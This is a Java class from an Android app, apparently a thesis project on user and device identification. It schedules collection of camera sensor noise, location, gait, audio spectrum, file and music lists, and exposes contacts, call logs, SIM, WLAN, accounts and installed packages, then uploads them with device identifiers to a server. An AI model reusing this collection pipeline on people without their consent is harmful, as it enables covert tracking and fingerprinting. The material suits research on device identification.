package com.tum.ident.data;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLDecoder;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;

import android.content.Context;
import android.graphics.Bitmap;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import android.view.SurfaceHolder;

import com.tum.ident.IdentificationConfiguration;
import com.tum.ident.IdentificationListener;
import com.tum.ident.IdentificationService;
import com.tum.ident.battery.BatteryData;
import com.tum.ident.camera.CameraData;
import com.tum.ident.files.FileData;
import com.tum.ident.files.FileItemList;
import com.tum.ident.gaitrecognition.StepData;
import com.tum.ident.identification.IdentificationData;
import com.tum.ident.identification.IdentificationItem;
import com.tum.ident.locations.LocationData;
import com.tum.ident.music.MusicData;
import com.tum.ident.music.MusicItemList;
import com.tum.ident.network.NetworkClient;
import com.tum.ident.network.ServerRunner;
import com.tum.ident.orientation.OrientationData;
import com.tum.ident.realtime.RealtimeData;
import com.tum.ident.realtime.RealtimeServer;
import com.tum.ident.result.ResultHandler;
import com.tum.ident.result.ResultItem;
import com.tum.ident.sensors.SensorData;
import com.tum.ident.spectrum.SpectrumData;
import com.tum.ident.stepdetector.StepDetector;
import com.tum.ident.storage.StorageHandler;

public class DataController implements Runnable, IdentificationListener {

	private final static String TAG = "DataController";
	
	private final long IdentVersion = 9;
	
	private IdentificationData identificationData = null;
	private CameraData cameraData = null;
	private SensorData sensorData = null;
	private StepData stepData = null;
	private LocationData locationData = null;
	private OrientationData orientationData = null;
	private StepDetector stepDetector = null;
	private MusicData musicData = null;
	private FileData fileData = null;
	private BatteryData batteryData = null;
	private SpectrumData spectrumData = null;
	
	
	private Context context;
	private String serverURL;
	private String debugURL;
	private boolean[] todoList = null;
	private DataItem[] dataItemList = null;
	private IdentificationListener listener;
	private ResultHandler resultHandler;
	private boolean appChanged = false;
	private boolean running = true;
	private boolean sendBatteryRealTime = true;
	private String userID = "";
	private String deviceID = "";
	private SurfaceHolder surfaceHolder;
	private IdentificationService service = null;
	private static int numTypes = 0;
	private long[] timer = new long[20];
	private long[] waitTime = new long[20];
	private long todoWaitTime = 3600000;
	private long todoTimer = 0;
	private long sendLocationCounter = 0;
	private boolean sendlistenerUpdate = false;
	private boolean waitForIdentificationItem = false;
	private BlockingQueue<DataItem> dataQueue = new ArrayBlockingQueue<DataItem>(1024);
	
	private static String userName = "";

	public enum DataType {
		PixelErrorFront, PixelErrorBack, DarkFrameFront, DarkFrameBack, Location, StepDetection, UserDevice, Music, File, Orientation, Battery, Spectrum
	}

	@SuppressWarnings("deprecation")
	public DataController(String serverURL, Context context,
			SurfaceHolder surfaceHolder, IdentificationListener listener) {
		this.surfaceHolder = surfaceHolder;
		this.serverURL = serverURL + "Identification";
		this.debugURL = serverURL + "Debug";
		this.listener = listener;
		this.context = context;
		this.resultHandler = new ResultHandler(listener, this);

		String absolutePath = context.getFilesDir().getAbsolutePath();
		int modDate = StorageHandler
				.lastModified(absolutePath + "/storage.dat").getDate();
		String modDateSaved = StorageHandler.readFromFile("app.dat");
		if (modDateSaved.length() > 0
				&& modDate != Integer.parseInt(modDateSaved)) {
			appChanged = true;
		}

		if (appChanged == false) {
			String settingsString = StorageHandler.readFromFile("storage.dat");
			Log.v(TAG, "settingsString: " + settingsString);
			if (settingsString.length() > 0) {
				Log.v(TAG,
						"settingsString.length(): " + settingsString.length());
				if (settingsString.length() >= IdentificationConfiguration.hashLength * 2) {
					String storedDeviceID = settingsString.substring(0,
							IdentificationConfiguration.hashLength);
					String storedUserID = settingsString.substring(
							IdentificationConfiguration.hashLength,
							IdentificationConfiguration.hashLength * 2);
					Log.v(TAG, "StorageHandler - deviceID: " + storedDeviceID
							+ " " + storedDeviceID.length());
					Log.v(TAG, "StorageHandler - userID: " + storedUserID + " "
							+ storedUserID.length());
					if (storedUserID.length() == IdentificationConfiguration.hashLength
							&& storedDeviceID.length() == IdentificationConfiguration.hashLength) {
						if (listener != null) {
							userID = storedUserID;
							deviceID = storedDeviceID;
							listener.onReceiveIds(deviceID, userID);
							Log.v(TAG,
									"listener.onReceiveIds(deviceID, userID);");
						}
					}
				}
			}
		}
		DataType[] dataTypeList = DataType.values();
		numTypes = dataTypeList.length;
		timer = new long[numTypes];
		waitTime = new long[numTypes];
		todoList = new boolean[numTypes];
		dataItemList = new DataItem[numTypes];
		loadTodoList();
		sendlistenerUpdate = true;
		Log.v("DEBUG", "new Thread(this).start();");
		new Thread(this).start();
		ServerRunner.run(RealtimeServer.class);

	}

	
	public void setParameter(String serverURL, Context context,
			SurfaceHolder surfaceHolder, IdentificationListener listener) {
		this.surfaceHolder = surfaceHolder;
		this.serverURL = serverURL + "Identification";
		this.debugURL = serverURL + "Debug";
		this.listener = listener;
		this.context = context;
		this.resultHandler = new ResultHandler(listener, this);
		if (identificationData == null) {
			identificationData = new IdentificationData(context, this);
			new Thread(this).start();
		}
		DataType[] dataTypeList = DataType.values();
		numTypes = dataTypeList.length;
		timer = new long[numTypes];
		waitTime = new long[numTypes];
		loadTodoList();
		if (userID != null || deviceID != null) {
			if (userID.length() == IdentificationConfiguration.hashLength
					&& deviceID.length() == IdentificationConfiguration.hashLength) {
				if (listener != null) {
					if (identificationData != null) {
						identificationData.onReceiveIds(deviceID, userID);
					}
					listener.onReceiveIds(deviceID, userID);
				}
			}
		}
		sendlistenerUpdate = true;
	}
	
	public void release() {
		running = false;
		if (sensorData != null) {
			sensorData.release();
		}
	}

	public static boolean keepItemData(DataType type) {
		if (type == DataType.UserDevice) {
			return false;
		} else if (type == DataType.File) {
			return false;
		} else if (type == DataType.Music) {
			return false;
		}
		return true;
	}

	public static int i(DataType type) {
		return type.ordinal();
	}



	@Override
	public void onReceiveUpdate() {

	}

	public void setService(IdentificationService service) {
		this.service = service;
	}

	public void checkResetData() {
		URL url;
		try {
			url = new URL("http://songbase.net/thesis/Reset.txt");
			HttpURLConnection urlConnection = (HttpURLConnection) url
					.openConnection();
			InputStream in = new BufferedInputStream(
					urlConnection.getInputStream());
			BufferedReader br = new BufferedReader(new InputStreamReader(in));
			StringBuilder sb = new StringBuilder();
			String line;
			while ((line = br.readLine()) != null) {
				sb.append(line);
			}
			String resetData = sb.toString();
			if (resetData.length() > 0) {
				if (resetData.equals("reset")) {
					if (stepData != null) {
						stepData.reset();
					}
				}

			}
			br.close();
			urlConnection.disconnect();
		} catch (MalformedURLException e) {

		} catch (IOException e) {

		}
	}

	public boolean newUpdateAvailable() {
		boolean result = false;

		URL url;
		try {
			url = new URL("http://songbase.net/thesis/Update.txt");

			HttpURLConnection urlConnection = (HttpURLConnection) url
					.openConnection();
			InputStream in = new BufferedInputStream(
					urlConnection.getInputStream());
			BufferedReader br = new BufferedReader(new InputStreamReader(in));
			StringBuilder sb = new StringBuilder();
			String line;
			while ((line = br.readLine()) != null) {
				sb.append(line);
			}
			String UpdateVersion = sb.toString();
			if (UpdateVersion.length() > 0) {
				if (UpdateVersion.length() < 5) {
					try {
						int Version = Integer.valueOf(UpdateVersion);
						if (Version > IdentVersion) {
							result = true;
						}
					} catch (NumberFormatException e) {
						result = false;
					}
				}

			}
			br.close();
			urlConnection.disconnect();

		} catch (MalformedURLException e) {

		} catch (IOException e) {

		}
		return result;
	}

	public void resetTimer() {
		todoWaitTime = 3600000;
		todoTimer = 0;
		sendLocationCounter = 0;

		waitTime[i(DataType.UserDevice)] = 43200000;
		timer[i(DataType.UserDevice)] = -waitTime[i(DataType.UserDevice)];

		waitTime[i(DataType.StepDetection)] = 7200000;
		timer[i(DataType.StepDetection)] = -timer[i(DataType.StepDetection)];

		waitTime[i(DataType.PixelErrorBack)] = 1800000;
		timer[i(DataType.PixelErrorBack)] = -timer[i(DataType.PixelErrorBack)];

		waitTime[i(DataType.Orientation)] = 300000;
		timer[i(DataType.Orientation)] = -timer[i(DataType.Orientation)];

		waitTime[i(DataType.Location)] = 1200000;
		timer[i(DataType.Location)] = -waitTime[i(DataType.Location)];

		waitTime[i(DataType.File)] = 43200000;
		timer[i(DataType.File)] = -waitTime[i(DataType.File)];

		waitTime[i(DataType.Music)] = 43200000;
		timer[i(DataType.Music)] = -waitTime[i(DataType.Music)];

		waitTime[i(DataType.Spectrum)] = 20000;
		timer[i(DataType.Spectrum)] = -waitTime[i(DataType.Spectrum)];
	}

	public boolean sendData(final boolean notification) {
		if (NetworkClient.networkAvailable()) {
			if (deviceID.length() > 0 && userID.length() > 0) {
				if (identificationData.isReady()) {

					DataType[] dataTypeList = DataType.values();
					Log.v("DEBUG", "sendData!");

					boolean success = true;
					DataItem item = null;
					String debugText = userID
							+ ", "
							+ deviceID
							+ ", "
							+ Settings.Secure.getString(
									context.getContentResolver(),
									Settings.Secure.ANDROID_ID) + "\n";
					debugText = debugText + Build.MANUFACTURER + " "
							+ Build.MODEL + "\n";
					debugText = debugText + userName + "\n";
					for (int i = 0; i < numTypes; i++) {
						todoList[i] = false;
						dataItemList[i] = null;
					}
					System.gc();
					for (int i = 0; i < numTypes; i++) {
						try {
							Thread.sleep(200);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
						String error = "";
						String summary = "";
						item = null;

						if (i == i(DataType.UserDevice)) {
							if (identificationData != null) {
								item = identificationData.getDataItem();
							}
						} else if (i == i(DataType.Spectrum)) {
							if (spectrumData != null) {
								item = spectrumData.getDataItem();
							}
						} else if (i == i(DataType.File)) {
							if (fileData != null) {
								item = fileData.getDataItem();
							}
						} else if (i == i(DataType.Music)) {
							if (musicData != null) {
								item = musicData.getDataItem();
							}
						} else if (i == i(DataType.StepDetection)) {
							if (stepData != null) {
								item = stepData.getDataItem();
								summary = stepData.getSummary();
							}
						} else if (i == i(DataType.Location)) {
							if (locationData != null) {
								item = locationData.getDataItem();
								summary = locationData.getSummary();
							}
						} else if (i == i(DataType.Orientation)) {
							if (orientationData != null) {
								item = orientationData.getDataItem();
							}
						} else if (i == i(DataType.Battery)) {
							if (batteryData != null) {
								item = batteryData.getDataItem();
							}
						} else if (i == i(DataType.PixelErrorFront)) {
							if (cameraData != null) {
								item = cameraData
										.getDataItem(DataType.PixelErrorFront);

							}
						} else if (i == i(DataType.PixelErrorBack)) {
							if (cameraData != null) {
								item = cameraData
										.getDataItem(DataType.PixelErrorBack);

							}
						} else if (i == i(DataType.DarkFrameFront)) {
							if (cameraData != null) {
								item = cameraData
										.getDataItem(DataType.DarkFrameFront);

							}
						} else if (i == i(DataType.DarkFrameBack)) {
							if (cameraData != null) {
								item = cameraData
										.getDataItem(DataType.DarkFrameBack);

							}
						}

						if (item != null) {
							error = DataItem.getLastError();
							if (sendData(item) == false) {
								debugText = debugText + "failed: " + item.getType()
										+ "   " + summary + "  " + error + "\n";
								success = false;
							} else {
								debugText = debugText + "sumbitted: "
										+ item.getType() + "   " + summary + "  "
										+ error + "\n";

							}
						} else {
							debugText = debugText + "no data: "
									+ dataTypeList[i] + "\n";
						}

						item.clear();
						item = null;
						System.gc();

					}
					if (notification) {
						listener.onReceiveDataSubmitted(success);
					}
					NetworkClient networkClient = new NetworkClient();
					Bundle message = new Bundle();

					message.putString("id", userID);
					message.putString("type", "submit");
					try {
						message.putString("debug",
								URLDecoder.decode(debugText, "UTF-8"));
					} catch (UnsupportedEncodingException e) {
						message.putString("debug", "encoding error");
					}
					networkClient.postBundleData(debugURL, message,
							NetworkClient.DataType.Byte, true);
					return true;
				}

			} else {
				if (waitForIdentificationItem == false) {
					if (identificationData.addIdentificationData()) {
						todoList[i(DataType.UserDevice)] = false;
						waitForIdentificationItem = true;
					}
				}
			}
		}
		return false;
	}

	public boolean sendDataRunnable(final boolean notification) {
		if (NetworkClient.networkAvailable()) {
			new Thread(new Runnable() {
				@Override
				public void run() {
					Looper.prepare();
					while (identificationData.isReady() == false) {
						try {
							Thread.sleep(500);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
					sendData(notification);
					Looper.loop();
				}
			}).start();
			return true;
		} else {
			if (listener != null) {
				if (notification) {
					listener.onReceiveDataSubmitted(false);
				}
			}
			return false;
		}
	}

	@Override
	public void run() {
		Looper.prepare();

		RealtimeData.init(context, this);

		if (service != null) {
			service.checkUpdateNotification(false);
		}
		Log.v(TAG, "context: " + context);
		if (identificationData == null) {
			identificationData = new IdentificationData(context, this);
		}
		cameraData = new CameraData(context, surfaceHolder, this);
		cameraData.takePictures();
		orientationData = new OrientationData(this);
		sensorData = new SensorData(context, orientationData, this);
		stepData = new StepData(context, sensorData, this);
		stepData.registerListener();
		locationData = new LocationData(context, this);
		musicData = new MusicData(context, this);
		fileData = new FileData(this);
		batteryData = new BatteryData(context, this);
		spectrumData = new SpectrumData();
		spectrumData.start();

		// if(stepData.isStepDetectorAvailable()==false){
		stepDetector = new StepDetector();
		sensorData.setStepDetector(stepDetector);
		stepDetector.setStepData(stepData);
		sensorData.registerStepListeners();
		// }
		orientationData.setSensorData(sensorData);

		Log.v(TAG, "startIdentification");
		// identificationData.startIdentification();
		if (identificationData != null) {
			if (userID.length() == IdentificationConfiguration.hashLength
					&& deviceID.length() == IdentificationConfiguration.hashLength) {
				identificationData.onReceiveIds(deviceID, userID);
			}
		}

		boolean identificationDataSent = false;

		long currentTime = System.currentTimeMillis();

		resetTimer();

		long sendItemsTimer = currentTime - 42900000;
		long sendItemsWaitTime = 43200000;

		long updateTimer = -1800000;
		long updateWaitTime = 1800000;

		DataItem item = null;

		Log.v(TAG, "while(running)");
		while (running) {

			if (sendBatteryRealTime) {
				RealtimeData.send(batteryData.getBatteryItemList());
				sendBatteryRealTime = true;
			}

			item = null;
			if (sendlistenerUpdate == true) {
				if (listener != null) {
					listener.onReceiveUpdate();
				}
				sendlistenerUpdate = false;
			}
			currentTime = System.currentTimeMillis();
			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			if (currentTime - updateTimer > updateWaitTime) {
				Log.v("DEBUG", "CHECK FOR UPDATES");
				if (service != null) {
					if (newUpdateAvailable()) {
						try {
							Uri notification = RingtoneManager
									.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
							Ringtone r = RingtoneManager.getRingtone(context,
									notification);
							r.play();
						} catch (Exception e) {
							e.printStackTrace();
						}
						service.checkUpdateNotification(true);
					} else {
						service.checkUpdateNotification(false);
					}
					checkResetData();
				}
				updateTimer = currentTime;
			}

			if (currentTime - sendItemsTimer > sendItemsWaitTime) {
				if (sendData(false)) {
					sendItemsWaitTime = currentTime;
				}

			}

			if (SystemClock.elapsedRealtime() > 10000) {
				if (item == null) {
					for (int i = 0; i < numTypes; i++) {
						if (waitTime[i] != 0) {
							if (currentTime - timer[i] > waitTime[i]) {
								if (i == i(DataType.UserDevice)) {
									if (identificationData != null) {
										if (NetworkClient.networkAvailable()) {
											Log.v(TAG,
													"TODO!!!: identificationDataSent: "
															+ identificationDataSent);
											if (waitForIdentificationItem == false) {
												if (userID.length() > 0
														&& deviceID.length() > 0) {
													if (identificationData
															.updateIdentificationData()) {
														todoList[i(DataType.UserDevice)] = false;
														waitForIdentificationItem = true;
													}
												} else {
													if (identificationData
															.addIdentificationData()) {
														todoList[i(DataType.UserDevice)] = false;
														waitForIdentificationItem = true;
													}
												}
											}
										}
									}
								} else if (i == i(DataType.Spectrum)) {
									if (spectrumData != null) {
										spectrumData.start();
									}
								} else if (i == i(DataType.File)) {
									if (fileData != null) {
										fileData.addFileList();
									}
								} else if (i == i(DataType.Music)) {
									if (musicData != null) {
										musicData.addMusicList();
									}
								} else if (i == i(DataType.StepDetection)) {
									if (stepData != null) {

										item = stepData.getDataItem();
										if (item != null) {
											todoList[i(DataType.StepDetection)] = false;
										}
									}
								} else if (i == i(DataType.Location)) {
									if (locationData != null) {
										if (sendLocationCounter % 12 == 0) {
											locationData.sendLocations(true);
										}
										locationData.registerListener(false);

										sendLocationCounter++;
									}
								} else if (i == i(DataType.Orientation)) {
									if (orientationData != null) {
										orientationData.startListening();
										sensorData
												.registerOrientationListeners();
									}
								} else if (i == i(DataType.PixelErrorBack)) {
									if (cameraData != null) {
										cameraData.takePictures();
									}
								}
								timer[i] = currentTime;
								break;
							}
						}
					}
				}
				if (item == null) {
					try {
						item = dataQueue.poll();
						Thread.sleep(100);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}

				if (item != null) {
					if (item.getData() != null) {
						if (listener != null) {
							listener.onReceiveUpdate();
						}
						storeData(item);

						if (NetworkClient.networkAvailable()) {
							if (sendData(item) == false) {
								todoList[item.getTypeIndex()] = keepItemData(item.getType());
								dataItemList[item.getTypeIndex()] = item;
							} else {
								todoList[item.getTypeIndex()] = false;
							}

						} else {
							todoList[item.getTypeIndex()] = true;
							dataItemList[item.getTypeIndex()] = item;
						}
						saveTodoList();
					}
				}
				if (todoTimer == 0
						|| System.currentTimeMillis() - todoTimer > todoWaitTime) {
					Log.v(TAG,
							"TODO!!!: networkAvailable: "
									+ NetworkClient.networkAvailable());
					if (NetworkClient.networkAvailable()) {
						todo();
						if (userID.length() == 0 || deviceID.length() == 0) {
							if (waitForIdentificationItem == false) {
								if (identificationData.addIdentificationData()) {
									todoList[i(DataType.UserDevice)] = false;
									waitForIdentificationItem = true;
								}
							}
						}
						todoWaitTime = 3600000;
					} else {
						todoWaitTime = 300000;
					}
					todoTimer = System.currentTimeMillis();
				}
			}
		}
		Log.v(TAG, "end loop!");
		Log.v(TAG, "running: " + running);
		Looper.loop();
	}

	private boolean todo() {
		Log.v(TAG, "todo()");
		for (int i = 0; i < todoList.length; i++) {
			if (todoList[i] && dataItemList[i] != null) {
				if (keepItemData(dataItemList[i].getType())) {
					if (sendData(dataItemList[i])) {
						todoList[i] = false;
					}

				} else {
					todoList[i] = false;
				}
			}
		}
		return true;
	}

	public static void setUserName(String n){
		userName = n;
	}
	

	public  void createAccelerationImage() {
		if (stepData != null) {
			stepData.createAccelerationImage();
		}
	}

	public  Bitmap getAccelerationImage(int index) {
		if (stepData != null) {
			return stepData.getAccelerationImage(index);
		}
		return null;
	}

	public  int nextClusterIndex(int index) {
		if (stepData != null) {
			return stepData.nextClusterIndex(index);
		}
		return 0;
	}

	public  Bitmap getSpectrumImage(int index) {
		if (spectrumData != null) {
			return spectrumData.getSpectrumImage(index);
		}
		return null;
	}
	
	
	public boolean isUserAvailable(){
		if(identificationData.getIdentificationItem()!=null){
			if(identificationData.getIdentificationItem().getUserDevice()!=null){
				if(identificationData.getIdentificationItem().getUserDevice().getUser()!=null){
					return true;
				}
			}
		}
		return false;
	}
	
	public boolean isDeviceAvailable(){
		if(identificationData.getIdentificationItem()!=null){
			if(identificationData.getIdentificationItem().getUserDevice()!=null){
				if(identificationData.getIdentificationItem().getUserDevice().getDevice()!=null){
					return true;
				}
			}
		}
		return false;
	}
	
	public String getAccountListString() {
		if(isUserAvailable()){
			return identificationData.getIdentificationItem().getUserDevice().getUser().getAccountListString();
		}
		return "";
	}

	public Bitmap getOrientationImage() {
		if (orientationData != null) {
			return orientationData.getOrientationImage();
		}
		return null;
	}
	
	public IdentificationItem getIdentificationItem(){
		return identificationData.getIdentificationItem();
	}
	
	public MusicItemList getMusicList(){
		if(musicData!=null){
			return musicData.getMusicList();
		}
		return null;
	}
	public FileItemList getFileList(){
		if(fileData!=null){
			return fileData.getFileList();
		}
		return null;
	}
	public void sendBatteryRealTime(){
		sendBatteryRealTime = true;
	}

	public String getMusicString() {
		if (musicData != null) {
			return musicData.getMusicString();
		} else {
			return "";
		}
	}

	public String getFileString() {
		if (fileData != null) {
			return fileData.getFileString();
		} else {
			return "";
		}
	}

	public String getLocationString() {
		if (locationData != null) {
			return locationData.getLocationString();
		} else {
			return "";
		}
	}

	public String getStepCounterString() {
		if (stepData != null) {
			return stepData.getStepCounterString();
		}
		return "";
	}

	public String getBatteryString() {
		if (batteryData != null) {
			return batteryData.getBatteryString();
		}
		return "";
	}

	public String getSIMListString() {
		if(isUserAvailable()){
			return identificationData.getIdentificationItem().getUserDevice().getUser()
				.getSIMListString();
		}
		return "";
	}

	public String getCarrierListString() {
		if(isUserAvailable()){
				return identificationData.getIdentificationItem().getUserDevice().getUser()
						.getCarrierListString();
		}
		return "";
	}

	public String getCallLogString() {
		if(isUserAvailable()){
			return identificationData.getIdentificationItem().getUserDevice().getUser()
					.getCallLogString();
		}
		return "";
	}

	public String getContactString() {
		if(isUserAvailable()){
			return identificationData.getIdentificationItem().getUserDevice().getUser()
					.getContactString();
		}
		return "";
	}

	public String getBluetoothString() {
		if(isUserAvailable() && isDeviceAvailable()){
			return identificationData.getIdentificationItem().getUserDevice().getDevice()
					.getBluetoothString()
					+ "\n\n"
					+ identificationData.getIdentificationItem().getUserDevice().getUser()
							.getBluetoothString();
		}
		return "";
	}

	public String getWLANString() {
		if(isUserAvailable() && isDeviceAvailable()){
		return identificationData.getIdentificationItem().getUserDevice().getDevice()
				.getWLANString()
				+ "\n\n"
				+ identificationData.getIdentificationItem().getUserDevice().getUser()
						.getWLANString();
		}
		return "";
	}

	public String getPackageString() {
		if(isUserAvailable()){
			return identificationData.getIdentificationItem().getUserDevice().getUser()
					.getPackageString();
		}
		return "";
	}

	@Override
	@SuppressWarnings("deprecation")
	public void onReceiveIds(String deviceID, String userID) {
		this.userID = userID;
		this.deviceID = deviceID;

		Log.v(TAG, "Received  deviceID: " + deviceID + " " + deviceID.length());
		Log.v(TAG, "Received  userID: " + userID + " " + userID.length());

		identificationData.onReceiveIds(deviceID, userID);
		StorageHandler.writeToFile("storage.dat", deviceID + userID);
		Log.v(TAG, "save settingsString: " + "storage.dat " + deviceID + userID);
		String absolutePath = context.getFilesDir().getAbsolutePath();
		int modDate = StorageHandler
				.lastModified(absolutePath + "/storage.dat").getDate();
		StorageHandler.writeToFile("app.dat", String.valueOf(modDate));
	}



	public static int getInt(byte[] arr, int off) {
		return arr[off] << 8 & 0xFF00 | arr[off + 1] & 0xFF;
	}

	private boolean sendData(DataItem item) {
		Log.v(TAG, "sendData(DataItem item)");
		boolean result = false;
		String url = serverURL;

		if (item.getParameter().equals("void") == false) {
			if (deviceID.length() > 0 && userID.length() > 0) {
				if (item.getParameter().length() > 0) {
					url = url + item.getParameter();
					if (identificationData != null) {
						url = url + "&deviceID=" + deviceID + "&userID="
								+ userID;
						url = url + "&type=" + item.getTypeIndex();
					}
				} else if (identificationData != null) {
					url = url + "?deviceID=" + deviceID + "&userID=" + userID;
					url = url + "&type=" + item.getTypeIndex();
				} else {
					url = url + "?type=" + item.getTypeIndex();
				}
			} else {
				return false;
			}

		} else {
			url = url + "?type=" +  item.getTypeIndex();
		}
		Log.v(TAG, "sendData to url: " + url);
		NetworkClient networkClient = new NetworkClient();
		byte[] compressed = DataFactory.compress(item.getData());
		Log.v(TAG, "uncompressed " + item.getData().length);
		Log.v(TAG, "compressed " + compressed.length);
		if (compressed != null) {
			byte[] bytes = networkClient.postByteData(url, compressed,
					NetworkClient.DataType.Byte, true);
			if (bytes != null) {
				if (bytes.length > 0) {
					if (bytes[0] == 31) {
						ResultItem resultItem = (ResultItem) DataFactory.decompressObject(bytes);
						if (resultItem != null) {
							result = resultHandler.getReturnValue(resultItem);
							if (result == true) {
								resultHandler.onReceive(resultItem);
							}
						}
					}
				}
			}
		}
		if (item.getType() == DataType.UserDevice) {
			waitForIdentificationItem = false;
		}
		return result;
	}

	public void loadTodoList() {
		Log.v(TAG, "loadTodoList");
		String path = "todolist.dat";
		FileInputStream file = StorageHandler.readFile(path);
		if (file != null) {
			for (int s = 0; s < DataType.values().length; s++) {
				byte todo = StorageHandler.readByte(file);
				if (todo == 1) {

					DataItem item = loadData(s);
					if (item != null) {
						todoList[i(item.getType())] = keepItemData(item.getType());
						dataItemList[i(item.getType())] = item;

					}

				} else {
					todoList[s] = false;
				}
			}
			StorageHandler.closeFile(file);
		}
	}

	public void saveTodoList() {
		Log.v(TAG, "saveTodoList");
		String path = "todolist.dat";
		FileOutputStream file = StorageHandler.openFile(path);
		if (file != null) {
			Log.v(TAG, "file!=null");
			for (int s = 0; s < DataType.values().length; s++) {
				Log.v(TAG, "todoList[" + s
						+ "]  -> StorageHandler.writeByte(file,(byte))");
				if (todoList[s]) {
					StorageHandler.writeByte(file, (byte) 1);
				} else {
					StorageHandler.writeByte(file, (byte) 0);
				}
			}
			Log.v(TAG, "StorageHandler.closeFile(file);");
			StorageHandler.closeFile(file);
		}
		Log.v(TAG, "saveTodoList done!");
	}

	private DataItem loadData(int s) {
		DataItem item = null;
		String path = "item_" + s + ".dat";
		item = (DataItem) StorageHandler.loadObject(path, true);
		return item;
	}

	private void storeData(DataItem item) {
		Log.v(TAG, "storeData(DataItem item)");
		String path = "item_" + item.getTypeIndex() + ".dat";
		FileOutputStream file = StorageHandler.openFile(path);
		byte data[] = DataFactory.getData(item);
		if (file != null && data != null) {
			StorageHandler.writeData(file, data);
			StorageHandler.closeFile(file);
		}
	}

	public void addData(String parameter, byte[] data, DataType type) {
		Log.v(TAG, "addData(String parameter,byte[] data,DataType type)");
		DataItem item = new DataItem(parameter, data, type);
		try {
			dataQueue.put(item);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	/*
	 * public void addData(String parameter,Object dataObject,DataType type){
	 * Log.v(TAG, "addData(String parameter,Object dataObject,DataType type)");
	 * DataItem item = new DataItem(parameter,dataObject,type); try {
	 * dataQueue.put(item); } catch (InterruptedException e) {
	 * e.printStackTrace(); } }
	 */

	public void addData(String parameter, Object dataObject) {
		DataType type = DataItem.getDataType(dataObject);
		if (type != null) {
			Log.v(TAG,
					"addData(String parameter,Object dataObject,DataType type)");
			DataItem item = new DataItem(parameter, dataObject);// ,type)
			try {
				dataQueue.put(item);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		if (RealtimeData.isRealTimeData(dataObject)) {
			RealtimeData.send(dataObject);
		}
	}

	public void loadData() {

	}

	@Override
	public void onReceiveDataSubmitted(boolean result) {
		// TODO Auto-generated method stub

	}

}
